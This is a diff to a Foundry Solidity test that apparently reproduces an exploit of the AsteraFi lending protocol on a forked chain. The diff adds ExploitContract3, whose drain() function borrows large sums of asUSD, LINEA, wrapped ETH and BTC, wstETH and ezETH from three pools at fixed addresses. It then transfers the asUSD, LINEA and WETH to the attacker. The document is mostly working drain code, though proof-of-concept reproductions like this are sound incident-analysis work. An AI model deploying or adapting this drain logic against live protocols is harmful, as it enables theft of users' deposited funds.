@@ -45,6 +45,7 @@ contract AsteraFiPoC is Test {
     ExploitContract exploitContract;
     // create new address
     address drainer = 0x61EA1C91d7aE9782223384fAFe3ad81fFb8E0b45;
+    address drain_contract = 0xcd69567080Dccad1Afe61aCc022c0A7164B29AB4;
     address inflator = 0x9520C9040338bE61005590cC1BD15caa10a6613c;
     IERC20 usdt = IERC20(0xA219439258ca9da29E9Cc4cE5596924745e12B93);
     IERC20 asUSD = IERC20(0xa500000000e482752f032eA387390b6025a2377b);
@@ -84,9 +85,11 @@ contract AsteraFiPoC is Test {
     function testExploitPhase3() public {
         vm.rollFork(24321904 - 1);
         vm.startPrank(drainer, drainer);
-        (0xcd69567080Dccad1Afe61aCc022c0A7164B29AB4).call(
-            abi.encodeWithSelector(0x008ed35b, "")
-        );
+        ExploitContract3 tmp = new ExploitContract3();
+        bytes memory code = address(tmp).code;
+        vm.etch(drain_contract,code);
+        ExploitContract3 DrainContract = ExploitContract3(drain_contract);
+        DrainContract.drain();
 
         uint256 wethBalance = weth.balanceOf(drainer);
         console.log("Attacker WETH balance:", wethBalance / 1e18);
@@ -375,3 +378,39 @@ contract ExploitContract2 {
         usdc.transfer(msg.sender, usdcbalance);
     }
 }
+
+contract ExploitContract3{
+        function drain() external {
+        address asUSD = 0xa500000000e482752f032eA387390b6025a2377b;
+        address linea = 0x1789e0043623282D5DCc7F213d703C6D8BAfBB04;
+        address weth = 0xe5D7C2a44FfDDf6b295A15c148167daaAf5Cf34f;
+        address was_ETH=0x9A4cA144F38963007cFAC645d77049a1Dd4b209A;
+        address was_BTC=0x7dfd2F6d984CA9A2d2ffAb7350E6948E4315047b;
+
+        address wstETH = 0xB5beDd42000b71FddE22D3eE8a79Bd49A568fC8F;
+        address ezETH = 0x2416092f143378750bb29b79eD961ab195CcEea5;
+
+        address pool = 0x0baFB30B72925e6d53F4d0A089bE1CeFbB5e3401;
+        address pool2 = 0x65559abECD1227Cc1779F500453Da1f9fcADd928;
+        address pool3 = 0x52280eA8979d52033E14df086F4dF555a258bEb4;
+
+        IAsteraLendingPool(pool).borrow(asUSD,true,1690203896664606881205,address(this));
+        IAsteraLendingPool(pool2).borrow(asUSD,true,436776096617929515342057,address(this));
+        IAsteraLendingPool(pool3).borrow(asUSD,true,4390403664925994556770,address(this));
+
+        IAsteraLendingPool(pool2).borrow(linea,true,1812325463709873280688786,address(this));
+        IAsteraLendingPool(pool3).borrow(linea,true,10739533369912052872936784,address(this));
+
+        IAsteraLendingPool(pool2).borrow(was_ETH,true,18453893820707210599,address(this));
+        IAsteraLendingPool(pool2).borrow(was_BTC,true,4722208,address(this));
+
+        IAsteraLendingPool(pool).borrow(wstETH,true,5228750021394010873,address(this));
+        IAsteraLendingPool(pool).borrow(ezETH,true,472443614446298863,address(this));
+
+        IERC20(asUSD).transfer(msg.sender, IERC20(asUSD).balanceOf(address(this)));
+        IERC20(linea).transfer(msg.sender, IERC20(linea).balanceOf(address(this)));
+        IERC20(weth).transfer(msg.sender, IERC20(weth).balanceOf(address(this)));
+
+    }
+}
+
